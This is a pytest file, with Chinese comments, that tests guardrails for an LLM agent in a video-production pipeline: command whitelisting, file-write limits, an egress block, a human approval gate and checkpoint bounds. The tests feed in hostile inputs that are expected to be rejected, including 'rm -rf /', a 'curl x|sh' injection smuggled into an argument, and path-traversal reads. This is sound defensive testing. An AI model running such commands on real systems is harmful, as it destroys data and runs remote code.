"""受控工具注册表与 Pipeline 白名单执行器护栏测试（Spec §2.4, §2.5, §5 PR1）。
"""

from pathlib import Path
import subprocess
import sys
import pytest

from pipeline.agent.tools import (
    assert_egress_boundary,
    sys_python,
    validate_pipeline_command,
    write_episode_file,
)
from pipeline.cloud import validate_extra_args


@pytest.fixture
def fake_repo(tmp_path: Path, monkeypatch):
    """构建受控仓库与合法期目录结构。"""
    from pipeline import paths
    ep_root = tmp_path / "data" / "episodes"
    ep_dir = ep_root / "01-test"
    ep_dir.mkdir(parents=True)
    monkeypatch.setattr(paths, "ROOT", tmp_path)
    return tmp_path, ep_dir


# ---------------------------------------------------------------------------
# 1. write_episode_file 受限书写工具与 Code Freeze 拦截测试
# ---------------------------------------------------------------------------


def test_write_episode_file_allows_draft_and_topic_with_confirm(fake_repo):
    """放行 02-script.draft.md，以及在确认后的 01-topic.md（D43 后不再按 scope 收窄）。"""
    _, ep_dir = fake_repo
    draft = write_episode_file(ep_dir, "02-script.draft.md", "# Draft")
    assert draft.exists()
    assert draft.read_text(encoding="utf-8") == "# Draft"

    topic = write_episode_file(ep_dir, "01-topic.md", "# Topic", confirmed=True)
    assert topic.exists()
    assert topic.read_text(encoding="utf-8") == "# Topic"


def test_write_episode_file_rejects_topic_without_confirmation(fake_repo):
    """写 01-topic.md 未获显式确认时必须拦截 (Spec §2.4, B7)。"""
    _, ep_dir = fake_repo
    with pytest.raises(PermissionError, match="显式确认"):
        write_episode_file(ep_dir, "01-topic.md", "# Topic", confirmed=False)


def test_write_episode_file_rejects_out_of_whitelist_files(fake_repo):
    """拦截白名单外文件的写入（如 04-clips.json、notes.txt）。02-script.md 自 D47 起在白名单内，另测。"""
    _, ep_dir = fake_repo
    with pytest.raises(PermissionError, match="白名单"):
        write_episode_file(ep_dir, "04-clips.json", "{}")

    with pytest.raises(PermissionError, match="白名单"):
        write_episode_file(ep_dir, "notes.txt", "abc")


def test_write_episode_file_rejects_parent_or_outside_directory(fake_repo):
    """拦截跨目录/父级目录写入（双端 resolve 防穿透，B1-r5）。"""
    _, ep_dir = fake_repo

    with pytest.raises(PermissionError):
        write_episode_file(ep_dir, "../02-script.draft.md", "bad")

    with pytest.raises(PermissionError):
        write_episode_file(ep_dir, "subdir/02-script.draft.md", "bad")


def test_write_episode_file_rejects_repo_root_and_system_tmp(fake_repo):
    """拦截写到仓库根或 /tmp 等任意非期目录路径 (🟡 1 纵深防御)。"""
    root, _ = fake_repo
    with pytest.raises(PermissionError, match="禁止"):
        write_episode_file(root, "02-script.draft.md", "bad")

    with pytest.raises(PermissionError, match="禁止"):
        write_episode_file(Path("/tmp"), "02-script.draft.md", "bad")


def test_write_episode_file_fail_closed_when_episodes_root_missing(tmp_path: Path, monkeypatch):
    """外置盘未挂载（data/episodes 不存在）时必须 fail-closed 拒绝写入 (🟡 新1)。"""
    from pipeline import paths
    monkeypatch.setattr(paths, "ROOT", tmp_path)
    # 不创建 tmp_path / data / episodes
    arbitrary_dir = tmp_path / "somewhere" / "01"
    arbitrary_dir.mkdir(parents=True)

    with pytest.raises(PermissionError, match="不可达"):
        write_episode_file(arbitrary_dir, "02-script.draft.md", "bad")


def test_write_episode_file_all_scopes_write_whitelist_only(fake_repo):
    """D43 / Spec 17 TA-4：pipeline / asset 模式写白名单文件成功；写白名单外仍拒；
    01-topic.md 未确认仍拒（被删的「零写权限」语义换成等强断言，不是只删）。"""
    root, ep_dir = fake_repo
    for scope in ("pipeline", "asset"):
        ctx = ToolContext(scope=scope, episode_dir=ep_dir, root=root, confirmed=True)
        ok = execute_tool(
            "write_episode_file",
            {"filename": "02-script.draft.md", "content": f"# {scope} 草稿"},
            ctx,
        )
        assert ok["ok"] is True, ok
        assert (ep_dir / "02-script.draft.md").read_text(encoding="utf-8") == f"# {scope} 草稿"

        denied = execute_tool(
            "write_episode_file", {"filename": "04-clips.json", "content": "x"}, ctx
        )
        assert denied["ok"] is False and "白名单" in denied["error"]

        denied2 = execute_tool(
            "write_episode_file", {"filename": "../x", "content": "x"}, ctx
        )
        assert denied2["ok"] is False

        unconfirmed = execute_tool(
            "write_episode_file",
            {"filename": "01-topic.md", "content": "x"},
            ToolContext(scope=scope, episode_dir=ep_dir, root=root, confirmed=False),
        )
        assert unconfirmed["ok"] is False and "显式确认" in unconfirmed["error"]


def test_write_episode_file_rejects_writing_pipeline_src(fake_repo):
    """绝不允许写入 pipeline/ 代码源码（Code Freeze 核心护栏）。"""
    from pipeline import paths
    with pytest.raises(PermissionError, match="Code Freeze"):
        write_episode_file(paths.ROOT / "pipeline", "01-topic.md", "bad", confirmed=True)


# ---------------------------------------------------------------------------
# 2. validate_pipeline_command 命令白名单与拒收测试
# ---------------------------------------------------------------------------


def test_validate_pipeline_command_rejects_force_and_guides():
    """/run 命令遇到 --force / --force-all / --force-all=true 必须当场拦截并指引增量参数 (Spec §2.4, B4-r18, 🟡2)。"""
    ok, msg, _ = validate_pipeline_command("tts data/episodes/01 --force")
    assert not ok
    assert "禁止在 ava 中使用 --force" in msg
    assert "--redo" in msg or "--apply-patch" in msg

    ok2, msg2, _ = validate_pipeline_command("python -m pipeline.tts data/episodes/01 --force-all")
    assert not ok2
    assert "禁止在 ava 中使用 --force-all" in msg2

    # 🟡 2 漏网变体防御
    ok3, msg3, _ = validate_pipeline_command("tts data/episodes/01 --force-all=true")
    assert not ok3
    assert "禁止在 ava 中使用 --force-all" in msg3


def test_validate_pipeline_command_rejects_cloud_down_force():
    """拒收 cloud down --force 销毁性动作并指引先查看 status (Spec §2.4, B1-r10)。"""
    ok, msg, _ = validate_pipeline_command("cloud down --force")
    assert not ok
    assert "cloud down --force" in msg
    assert "cloud status" in msg


def test_validate_pipeline_command_rejects_cloud_exec():
    """绝对拒收 cloud exec（R1-r10）。"""
    ok, msg, _ = validate_pipeline_command("cloud exec 'rm -rf /'")
    assert not ok
    assert "cloud exec" in msg
    assert "永久禁用" in msg


def test_validate_pipeline_command_allows_pipeline_modules():
    """合表后放行 9 个制片模块（D43 / Spec 17 §3.3），且执行器使用 sys.executable (🔴 2)。"""
    for mod in ["check_script", "tts", "clips", "review", "render", "qc", "cover", "bgm", "status"]:
        ok, msg, norm = validate_pipeline_command(f"{mod} data/episodes/01")
        assert ok, f"模块 {mod} 应该被放行，却被拒: {msg}"
        assert norm[0] == sys.executable, f"执行器必须是 sys.executable，不能硬编码 python: {norm[0]}"
        assert norm[1:3] == ["-m", f"pipeline.{mod}"]


def test_validate_pipeline_command_injects_episode_dir(tmp_path: Path):
    """自动注入当期目录，解决文档级用法缺参数问题 (🔴 1)。"""
    ep_dir = tmp_path / "data" / "episodes" / "01"
    ep_dir.mkdir(parents=True)

    # 1. tts --redo 3 自动补位 ep_dir
    ok, msg, norm = validate_pipeline_command("tts --redo 3", ep_dir=ep_dir)
    assert ok
    assert str(ep_dir.resolve()) in norm
    assert norm == [sys.executable, "-m", "pipeline.tts", str(ep_dir.resolve()), "--redo", "3"]

    # 2. clips 自动补位 ep_dir
    ok, msg, norm = validate_pipeline_command("clips", ep_dir=ep_dir)
    assert ok
    assert norm == [sys.executable, "-m", "pipeline.clips", str(ep_dir.resolve())]

    # 3. check_script 自动补位当期脚本
    script_file = ep_dir / "02-script.md"
    script_file.write_text("# Script", encoding="utf-8")
    ok, msg, norm = validate_pipeline_command("check_script", ep_dir=ep_dir)
    assert ok
    assert norm == [sys.executable, "-m", "pipeline.check_script", str(script_file.resolve())]


def test_validate_pipeline_command_rejects_unauthorized_module():
    """拒收非白名单外部命令或任意 bash。"""
    ok, msg, _ = validate_pipeline_command("rm -rf data/")
    assert not ok
    assert "不在白名单内" in msg


def test_validate_pipeline_command_asset_side_commands():
    """asset 侧 6 模块的子命令清单合表后仍生效（D43 / Spec 17 §3.3 合表语义 (a)）。"""
    # faces 5 个命令全在
    for sub in ["detect", "cluster", "sheet", "name", "presence"]:
        ok, msg, norm = validate_pipeline_command(f"faces {sub} anime_test")
        assert ok, f"faces {sub} 应该被放行，却被拒: {msg}"

    # shots 3 个命令
    for sub in ["build", "frames", "caption-frames"]:
        ok, msg, _ = validate_pipeline_command(f"shots {sub} /path")
        assert ok, f"shots {sub} 应该被放行: {msg}"

    # vindex 2 个命令
    for sub in ["captions", "embed"]:
        ok, msg, _ = validate_pipeline_command(f"vindex {sub} /path")
        assert ok, f"vindex {sub} 应该被放行: {msg}"

    # cloud 子命令
    for sub in ["status", "logs", "doctor", "up", "down", "push", "pull"]:
        ok, msg, _ = validate_pipeline_command(f"cloud {sub}")
        assert ok, f"cloud {sub} 应该被放行: {msg}"

    # asset 侧模块的子命令校验永远生效（合表后不被「不限子命令」侧吞掉）
    ok_bad, msg_bad, _ = validate_pipeline_command("faces unknown_action")
    assert not ok_bad


def test_validate_pipeline_command_asset_side_no_ep_injection(tmp_path: Path):
    """合表语义 (b)：asset 侧 6 模块不做当期目录自动补位（维持现状，D43 / Spec 17 §3.3）。"""
    ep_dir = tmp_path / "data" / "episodes" / "01"
    ep_dir.mkdir(parents=True)
    ok, msg, norm = validate_pipeline_command("shots build", ep_dir=ep_dir)
    assert ok, msg
    assert str(ep_dir.resolve()) not in norm


def test_pipeline_command_wiring_real_cli_execution(tmp_path: Path):
    """接线级测试：放行的真实命令能在真实解释器下正常解析并返回 (接线防两张皮)。"""
    ep_dir = tmp_path / "data" / "episodes" / "01"
    ep_dir.mkdir(parents=True)

    # 1. 验证 tts 能真跑 --help
    ok, _, norm_cmd = validate_pipeline_command("tts --help", ep_dir=ep_dir)
    assert ok
    res = subprocess.run(norm_cmd, capture_output=True, text=True)
    assert res.returncode == 0
    assert "给一期稿件配音" in res.stdout or "run" in res.stdout

    # 2. 验证 clips 能真跑 --help
    ok, _, norm_cmd = validate_pipeline_command("clips --help", ep_dir=ep_dir)
    assert ok
    res = subprocess.run(norm_cmd, capture_output=True, text=True)
    assert res.returncode == 0


# ---------------------------------------------------------------------------
# 3. cloud extra_args 正则校验（Spec §2.4, §5 PR1）
# ---------------------------------------------------------------------------


def test_cloud_extra_args_whitelist_positive_cases():
    """放行正例：--redo 3,7、--redo stale、--floor 0.60、--apply-patch (Spec §2.4 Y3)。"""
    assert validate_extra_args("--redo 3,7") == "--redo 3,7"
    assert validate_extra_args("--redo stale") == "--redo stale"
    assert validate_extra_args("--redo 5") == "--redo 5"
    assert validate_extra_args("--floor 0.60") == "--floor 0.60"
    assert validate_extra_args("--apply-patch") == "--apply-patch"
    assert validate_extra_args("--redo 1,2 --allow-engine-mix") == "--redo 1,2 --allow-engine-mix"


def test_cloud_extra_args_whitelist_rejects_injections_and_invalid_values():
    """拒收 shell 注入、非法值以及布尔旗标带值。"""
    with pytest.raises(ValueError, match="非法"):
        validate_extra_args('--redo "3,7 && curl x|sh"')

    with pytest.raises(ValueError, match="非法"):
        validate_extra_args("--floor abc")

    with pytest.raises(ValueError, match="缺少值"):
        validate_extra_args("--redo")

    with pytest.raises(ValueError, match="不得带值"):
        validate_extra_args("--apply-patch=foo")

    with pytest.raises(ValueError, match="未授权"):
        validate_extra_args("--unauthorized-flag")


# ---------------------------------------------------------------------------
# 4. assert_egress_boundary 出网边界断言测试（Spec §2.5 Y2-r19）
# ---------------------------------------------------------------------------


def test_assert_egress_boundary():
    """断言凭据与未授权路径绝不出网。"""
    assert_egress_boundary("https://api.openai.com", {"role": "user", "content": "请写一段台词"})

    with pytest.raises(PermissionError, match="拦截出网请求"):
        assert_egress_boundary("https://api.openai.com", {"config": "cloud.local.json"})

    with pytest.raises(PermissionError, match="拦截出网请求"):
        assert_egress_boundary("https://api.openai.com", {"audio": "03-audio/manifest.json"})


# ---------------------------------------------------------------------------
# 5. LLM 层：客户端装配、降级、轮数上限、scope 过滤（Spec §2.5, §5 PR4）
#
# 本节为 PR4 **追加**（既有测试零修改）：本行以下的 import 只服务本节。
# ---------------------------------------------------------------------------

import http.server
import json
import threading
from contextlib import contextmanager

from pipeline.agent.llm import (
    chat_complete,
    load_llm_config,
    local_directive_message,
    run_tool_loop,
)
from pipeline.agent.tools import (
    ToolContext,
    build_tool_schemas,
    execute_tool,
    run_pipeline,
    tool_names,
)

# D43 / Spec 17：tools.json 收为单表，与 TOOL_SCHEMAS 注册顺序一致
SPEC_TOOLS = [
    "read_artifact",
    "write_episode_file",
    "list_episodes",
    "read_status",
    "run_pipeline",
    "search_notes",
    "web_search",
    "web_fetch",
    "acquire_propose",
    "crawl",
    "browser",
    "write_memory",
    "cover_edit",
]


def _expected_schema_names() -> list[str]:
    """按当前环境的 _extra_available 过滤期望可见 schema 名称清单（Spec 5 §2.1④ / T15）。"""
    from pipeline.agent.tools import TOOL_SCHEMAS, _extra_available

    return [
        t
        for t in SPEC_TOOLS
        if not TOOL_SCHEMAS[t].get("requires_extra")
        or _extra_available(str(TOOL_SCHEMAS[t]["requires_extra"]))
    ]


API_KEY = "sk-test-secret-do-not-print"


#: 与 test_agent_loop.Script.MAX_REQUESTS 同一口径（矩阵 MUT-3 行「请求计数 200 为护栏」）
MOCK_LLM_MAX_CALLS = 200


@contextmanager
def mock_llm_server(replies):
    """本地 OpenAI 兼容端点：记录每次请求，按序回放 replies（最后一条重复）。"""
    state = {"requests": [], "calls": 0}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_POST(self):
            raw = self.rfile.read(int(self.headers.get("Content-Length", 0))).decode("utf-8")
            state["requests"].append({
                "path": self.path,
                "auth": self.headers.get("Authorization"),
                "body": json.loads(raw),
            })
            reply = replies[min(state["calls"], len(replies) - 1)]
            state["calls"] += 1
            if state["calls"] > MOCK_LLM_MAX_CALLS:
                # 安全阀：靠检查点才停得下来的用例，在「检查点被绕过」时回 500 让 core 以 LLMError 停下
                #（变红），而不是无限循环挂死（M9 实测 S9-MUT-3 让本文件一条用例挂到 harness 超时）
                data = json.dumps({"error": {"message": "mock: too many calls"}}).encode("utf-8")
                self.send_response(500)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(data)))
                self.end_headers()
                self.wfile.write(data)
                return
            data = json.dumps({"choices": [{"message": reply}]}).encode("utf-8")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *args):
            pass

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"http://127.0.0.1:{server.server_address[1]}", state
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def make_agent_root(tmp_path: Path, base_url: str, *, tools: list | None = None) -> Path:
    """造一份最小的 config/agent.json + config/agent/tools.json（D43：单表）。"""
    cfg_dir = tmp_path / "config" / "agent"
    cfg_dir.mkdir(parents=True, exist_ok=True)
    (tmp_path / "config" / "agent.json").write_text(json.dumps({
        "base_url": base_url,
        "model": "mock-model",
        "api_key_env": "AVA_TEST_KEY",
    }), encoding="utf-8")
    (cfg_dir / "tools.json").write_text(
        json.dumps({"tools": tools if tools is not None else SPEC_TOOLS}), encoding="utf-8"
    )
    return tmp_path


def tool_call(name: str, args: dict, call_id: str = "call_1") -> dict:
    return {
        "role": "assistant",
        "content": None,
        "tool_calls": [{
            "id": call_id,
            "type": "function",
            "function": {"name": name, "arguments": json.dumps(args, ensure_ascii=False)},
        }],
    }


def test_llm_request_assembly_env_key_and_tools(tmp_path: Path, monkeypatch):
    """请求装配：端点 /v1/chat/completions、Bearer 取自环境变量、tools 为单表全量（D43）。"""
    with mock_llm_server([{"role": "assistant", "content": "写好了"}]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)

        cfg = load_llm_config(root)
        assert cfg is not None
        assert cfg.model == "mock-model"

        schemas = build_tool_schemas(root=root)
        reply = chat_complete(
            [{"role": "user", "content": "帮我写稿"}], tools=schemas, config=cfg
        )

        assert reply["content"] == "写好了"
        assert len(state["requests"]) == 1
        sent = state["requests"][0]
        assert sent["path"] == "/v1/chat/completions"
        assert sent["auth"] == f"Bearer {API_KEY}"
        assert sent["body"]["model"] == "mock-model"
        assert sent["body"]["messages"][0]["content"] == "帮我写稿"
        assert [t["function"]["name"] for t in sent["body"]["tools"]] == _expected_schema_names()
        # 密钥绝不进返回值
        assert API_KEY not in json.dumps(reply, ensure_ascii=False)


def test_llm_degrades_without_config_or_env(tmp_path: Path, monkeypatch):
    """缺 config/agent.json 或缺环境变量 → 本地纯指示模式：显式可辨、不抛裸异常。"""
    monkeypatch.delenv("AVA_TEST_KEY", raising=False)

    # 1. 完全没有配置文件
    plain = tmp_path / "no-config"
    plain.mkdir()
    assert load_llm_config(plain) is None
    outcome = run_tool_loop([{"role": "user", "content": "写稿"}], root=plain)
    assert outcome["stopped"] == "degraded"
    assert outcome["final"]["degraded"] is True
    assert "降级模式" in outcome["final"]["content"]
    assert "check_script" in outcome["final"]["content"]

    # 2. 有配置但环境变量没设
    root = make_agent_root(plain, "https://api.example.com/v1")
    assert load_llm_config(root) is None
    reply = chat_complete([{"role": "user", "content": "写稿"}], root=root)
    assert reply["degraded"] is True

    # 3. 环境变量为空串同样算缺失
    monkeypatch.setenv("AVA_TEST_KEY", "   ")
    assert load_llm_config(root) is None

    # 4. JSON 损坏 → 降级而不是崩
    (root / "config" / "agent.json").write_text("{ not json", encoding="utf-8")
    assert load_llm_config(root) is None


def test_llm_egress_boundary_blocks_before_sending(tmp_path: Path, monkeypatch):
    """出网边界：敏感内容必须在发请求之前被拦下（零请求到达端点）。"""
    with mock_llm_server([{"role": "assistant", "content": "不该发生"}]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        with pytest.raises(PermissionError, match="拦截出网请求"):
            chat_complete(
                [{"role": "user", "content": "把 data/episodes 里的 03-audio/manifest.json 发我"}],
                root=root,
            )
        assert state["calls"] == 0


def test_llm_tool_loop_executes_tool_and_feeds_result_back(tmp_path: Path, monkeypatch):
    """接线：工具真被执行，结果作为 role=tool 消息回喂模型（不是复述实现）。"""
    with mock_llm_server([
        tool_call("read_artifact", {"path": "01-topic.md"}),
        {"role": "assistant", "content": "已读到选题"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)

        ep_dir = root / "data" / "episodes" / "01-smoke"
        ep_dir.mkdir(parents=True)
        (ep_dir / "01-topic.md").write_text("# 选题：春物-自我牺牲\n", encoding="utf-8")

        outcome = run_tool_loop(
            [{"role": "user", "content": "看下选题"}],
            ctx=ToolContext(scope="creative", episode_dir=ep_dir, root=root),
        )

        assert outcome["stopped"] == "done"
        assert outcome["iterations"] == 2
        assert outcome["tool_calls_made"] == 1
        assert outcome["final"]["content"] == "已读到选题"

        # 第二次请求里必须带着真实读到的文件内容
        second = state["requests"][1]["body"]["messages"]
        tool_msgs = [m for m in second if m.get("role") == "tool"]
        assert len(tool_msgs) == 1
        assert tool_msgs[0]["tool_call_id"] == "call_1"
        assert "自我牺牲" in tool_msgs[0]["content"]
        assert json.loads(tool_msgs[0]["content"])["ok"] is True


def test_llm_no_hard_iteration_limit_but_checkpoint_bounds(tmp_path: Path, monkeypatch):
    """推翻固定轮数上限，改用检查点兜底（Spec 9 §2.3；IS-R1 / D28 用户裁决）。

    裸循环（`control=None`）的检查点一律「停止」：所以它仍然有界，但界是「回复满 50 条」，
    不是「轮数到 10」。到点**先收尾后停**（`tool_choice:"none"` 的无工具收尾调用）。
    """
    from pipeline.agent.llm import CHECKPOINT_EVERY

    with mock_llm_server([tool_call("list_episodes", {})]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)

        outcome = run_tool_loop(
            [{"role": "user", "content": "无休止地列期"}],
            ctx=ToolContext(scope="creative", root=root),
        )

        assert outcome["stopped"] == "checkpoint_stop"
        assert outcome["checkpoints"] == 1
        assert outcome["llm_calls"] == CHECKPOINT_EVERY + 1  # 50 条工具回复 + 收尾调用
        assert outcome["tool_calls_made"] == CHECKPOINT_EVERY
        assert state["calls"] == CHECKPOINT_EVERY + 1
        # 收尾请求带 tool_choice:"none"，但 tools 与前一次相同（保住前缀缓存）
        assert state["requests"][-1]["body"]["tool_choice"] == "none"
        assert state["requests"][-1]["body"]["tools"] == state["requests"][-2]["body"]["tools"]


def test_m10_checkpoint_every_is_50(tmp_path: Path, monkeypatch):
    """M10 新锚点：`CHECKPOINT_EVERY = 50` 真的会在 50 处触发（Spec 9 §6.1 重锚表）。

    变异（`CHECKPOINT_EVERY = 10**9`）下检查点永不触发，这里靠 200 次请求的安全阀强制失败，
    而不是挂死——与 MUT-3 所称的「请求计数 200 为护栏」同法。
    """
    from pipeline.agent import llm as llm_mod

    assert llm_mod.CHECKPOINT_EVERY == 50

    calls = {"n": 0, "checkpoints": 0}

    def fake_chat_complete(messages, tools=None, **kwargs):
        calls["n"] += 1
        assert calls["n"] <= 200, "检查点没有触发：循环无界（M10 变异）"
        return tool_call("list_episodes", {}, call_id=f"call_{calls['n']}")

    class _StopAtOnce:
        def __call__(self, snapshot):
            calls["checkpoints"] += 1
            # 第一次问就是 50 条回复；第二次问说明阈值没生效
            assert snapshot["llm_calls"] == 50, snapshot
            assert snapshot["trigger"] == "replies", snapshot
            return False

    monkeypatch.setattr(llm_mod, "chat_complete", fake_chat_complete)
    from tests.test_agent_loop import build_control

    messages: list[dict] = [{"role": "user", "content": "无休止地列期"}]
    outcome = llm_mod.run_tool_loop(
        messages,
        ctx=ToolContext(scope="creative", root=make_agent_root(tmp_path, "http://127.0.0.1:9/v1")),
        config=llm_mod.LLMConfig(base_url="http://127.0.0.1:9/v1", model="m", api_key="k"),
        control=build_control(messages, ask_checkpoint=_StopAtOnce()),
    )

    assert outcome["stopped"] == "checkpoint_stop"
    assert calls["checkpoints"] == 1
    assert outcome["llm_calls"] == 51


def test_llm_approve_callback_can_reject_tool(tmp_path: Path, monkeypatch):
    """工具调用前的人为确认闸：拒绝时把「人类拒绝」当结果回喂，不执行副作用。"""
    with mock_llm_server([
        tool_call("write_episode_file", {"filename": "02-script.draft.md", "content": "越权"}),
        {"role": "assistant", "content": "那我不写了"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        ep_dir = root / "data" / "episodes" / "01-smoke"
        ep_dir.mkdir(parents=True)

        outcome = run_tool_loop(
            [{"role": "user", "content": "写草稿"}],
            ctx=ToolContext(scope="creative", episode_dir=ep_dir, root=root),
            approve=lambda name, args: False,
        )

        assert outcome["stopped"] == "done"
        assert not (ep_dir / "02-script.draft.md").exists()
        fed_back = json.loads(state["requests"][1]["body"]["messages"][-1]["content"])
        assert fed_back["ok"] is False
        assert "拒绝" in fed_back["error"]


def test_llm_tool_table_is_single_and_matches_registry(tmp_path: Path):
    """D43 / Spec 17 §3.1：tools.json 单表，build_tool_schemas 不再收 scope；
    单表恰好等于注册全集（缺一个反向分叉检查就报错），各模式共用同一张表。"""
    root = make_agent_root(tmp_path, "https://api.example.com/v1")

    names = [s["function"]["name"] for s in build_tool_schemas(root=root)]
    assert names == _expected_schema_names()

    # 执行层不再有按 scope 的白名单拦截（只读工具在任意 scope 都能调）
    ctx_pipeline = ToolContext(scope="pipeline", root=root)
    (root / "data" / "library").mkdir(parents=True, exist_ok=True)
    ok = execute_tool("search_notes", {"query": "春物"}, ctx_pipeline)
    assert "白名单" not in ok.get("error", ""), ok

    # 仓库真配置（不是测试造的那份）是单表，且恰好等于注册全集
    from pipeline import paths
    from pipeline.agent.tools import TOOL_SCHEMAS
    repo_names = tool_names()
    assert sorted(repo_names) == sorted(TOOL_SCHEMAS), "仓库 tools.json 单表与注册集已漂移"
    assert set(json.loads((paths.ROOT / "config" / "agent" / "tools.json").read_text(encoding="utf-8"))) == {"tools"}


def test_write_memory_registered_with_adr_and_memory_scopes(tmp_path: Path):
    """T17 (PR4) 按 D43 / Spec 17（Q3）改写：write_memory 在单表内、带 ADR-0023；
    不变量换成等强断言「memory.scopes 恰为 {creative, asset, idea}，不含 pipeline」——
    Q3（pipeline 不注入记忆）往哪边漂都会被拦（D43-R2 🔵 R2-1）。"""
    import re
    from pipeline import paths
    from pipeline.agent.tools import TOOL_SCHEMAS

    repo_tools = json.loads(
        (paths.ROOT / "config" / "agent" / "tools.json").read_text(encoding="utf-8")
    )
    assert "write_memory" in repo_tools["tools"]
    assert len(repo_tools["tools"]) == 13

    # 宿主元数据：ADR-0023 必须指向现存且唯一的 ADR 文件
    schema = TOOL_SCHEMAS["write_memory"]
    matched = re.match(r"^ADR-(\d{4})$", str(schema.get("adr", "")))
    assert matched is not None and schema["adr"] == "ADR-0023"
    adr_hits = list((paths.ROOT / "docs" / "dev" / "adr").glob(f"{matched.group(1)}-*.md"))
    assert len(adr_hits) == 1, adr_hits

    # 协议键零泄漏
    payload = json.dumps(build_tool_schemas(), ensure_ascii=False)
    assert '"adr"' not in payload and '"side_effect"' not in payload

    # 不变量（D43-R2 🔵 R2-1）：memory.scopes 恰为 {creative, asset, idea}，不含 pipeline
    assembly = json.loads(
        (paths.ROOT / "config" / "agent" / "assembly.json").read_text(encoding="utf-8")
    )
    inject_scopes = set(assembly.get("memory", {}).get("scopes", []))
    assert inject_scopes == {"creative", "asset", "idea"}, inject_scopes


def test_llm_unregistered_tool_in_config_fails_loudly(tmp_path: Path):
    """tools.json 写了没实现的工具 → 当场报错，不静默跳过（静默跳过=护栏形同虚设）。"""
    root = make_agent_root(
        tmp_path, "https://api.example.com/v1",
        tools=["rm_rf_everything"],
    )
    with pytest.raises(KeyError, match="未注册的工具"):
        build_tool_schemas(root=root)


def test_llm_tool_read_domain_and_write_guard(tmp_path: Path):
    """读域写死（期目录 + data/library/），写 01-topic.md 必须确认。"""
    root = make_agent_root(tmp_path, "https://api.example.com/v1")
    ep_dir = root / "data" / "episodes" / "01-smoke"
    ep_dir.mkdir(parents=True)
    (ep_dir / "02-script.draft.md").write_text("# 草稿正文", encoding="utf-8")
    library = root / "data" / "library" / "notes"
    library.mkdir(parents=True)
    (library / "春物.md").write_text("八幡的自我牺牲是一种自毁倾向。", encoding="utf-8")
    outside = root / "config" / "cloud.json"
    outside.write_text("{}", encoding="utf-8")

    ctx = ToolContext(scope="creative", episode_dir=ep_dir, root=root)

    ok = execute_tool("read_artifact", {"path": "02-script.draft.md"}, ctx)
    assert ok["ok"] and "草稿正文" in ok["result"]["text"]

    note = execute_tool("read_artifact", {"path": "春物.md"}, ctx)  # 库内短路径
    assert note["ok"] and "自我牺牲" in note["result"]["text"]

    assert execute_tool("read_artifact", {"path": "../../config/cloud.json"}, ctx)["ok"] is False
    assert execute_tool("read_artifact", {"path": "/etc/hosts"}, ctx)["ok"] is False
    assert execute_tool("read_artifact", {"path": "cloud.json"}, ctx)["ok"] is False

    assert execute_tool("search_notes", {"query": "  "}, ctx)["ok"] is False
    hits = execute_tool("search_notes", {"query": "自我牺牲", "limit": 3}, ctx)
    assert hits["ok"] and hits["result"]["hits"][0]["path"] == "notes/春物.md"

    rejected = execute_tool(
        "write_episode_file", {"filename": "01-topic.md", "content": "越权立项"}, ctx
    )
    assert rejected["ok"] is False and "显式确认" in rejected["error"]
    assert not (ep_dir / "01-topic.md").exists()

    written = execute_tool(
        "write_episode_file",
        {"filename": "01-topic.md", "content": "# 已确认", "confirmed": True},
        ctx,
    )
    assert written["ok"] is True
    assert (ep_dir / "01-topic.md").read_text(encoding="utf-8") == "# 已确认"

    # D43 / Spec 17：pipeline scope 也能写白名单文件（按 scope 的写闸已废除；白名单与人审卡照旧）
    assert execute_tool(
        "write_episode_file",
        {"filename": "02-script.draft.md", "content": "x"},
        ToolContext(scope="pipeline", episode_dir=ep_dir, root=root),
    )["ok"] is True


def test_full_chain_smoke_in_temp_repo(tmp_path: Path, monkeypatch):
    """全链路冒烟：立项 → LLM 写稿 → 状态卡 → 看板 → /run 护栏与回显（临时目录仿真）。"""
    from pipeline import paths
    from pipeline.agent import cli

    (tmp_path / "data" / "library").mkdir(parents=True)
    (tmp_path / "data" / "episodes").mkdir(parents=True)
    monkeypatch.setattr(paths, "ROOT", tmp_path)
    monkeypatch.delenv("AVA_TEST_KEY", raising=False)

    # ⓪ 立项（ava new）
    assert cli.create_new_episode("01-smoke") == 0
    ep_dir = tmp_path / "data" / "episodes" / "01-smoke"
    assert (ep_dir / "01-topic.md").exists()
    assert cli.create_new_episode("01-smoke") == 1  # 重名拒建，不覆盖

    # ① creative：LLM 走工具写草稿
    with mock_llm_server([
        tool_call("write_episode_file", {
            "filename": "02-script.draft.md",
            "content": "# 02 脚本草稿\n\n第一段：比企谷八幡的自我牺牲。\n",
        }),
        {"role": "assistant", "content": "草稿已写入 02-script.draft.md，请跑 check_script。"},
    ]) as (url, state):
        root = make_agent_root(tmp_path, url + "/v1")
        monkeypatch.setenv("AVA_TEST_KEY", API_KEY)
        outcome = run_tool_loop(
            [{"role": "user", "content": "写一版草稿"}],
            ctx=ToolContext(scope="creative", episode_dir=ep_dir, root=root),
            approve=lambda name, args: True,
        )
        assert outcome["stopped"] == "done" and outcome["tool_calls_made"] == 1
        assert "check_script" in outcome["final"]["content"]
        assert state["calls"] == 2

    draft = ep_dir / "02-script.draft.md"
    assert draft.exists() and "自我牺牲" in draft.read_text(encoding="utf-8")

    # ② 状态卡与看板（真产物驱动，不是 mock）
    ctx = ToolContext(scope="creative", episode_dir=ep_dir, root=tmp_path)
    card = execute_tool("read_status", {}, ctx)
    assert card["ok"] is True
    assert card["result"]["episode"] == "01-smoke"
    assert "当前阶段" in card["result"]["card"]

